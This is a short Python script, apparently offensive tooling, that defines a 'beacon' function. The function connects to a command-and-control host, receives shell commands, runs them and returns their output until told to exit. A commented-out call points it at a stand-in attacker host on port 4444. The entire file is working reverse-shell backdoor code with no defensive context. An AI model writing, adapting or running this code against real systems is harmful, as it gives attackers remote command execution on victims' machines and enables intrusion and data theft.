#!/usr/bin/env python3
import socket, subprocess

def beacon(c2_ip, c2_port):
    s = socket.socket()
    s.connect((c2_ip, c2_port))
    s.send(b"[*] Beacon ready\n")
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        out = subprocess.getoutput(cmd)
        s.send(out.encode())
    s.close()

# beacon("attacker.localhost", 4444)
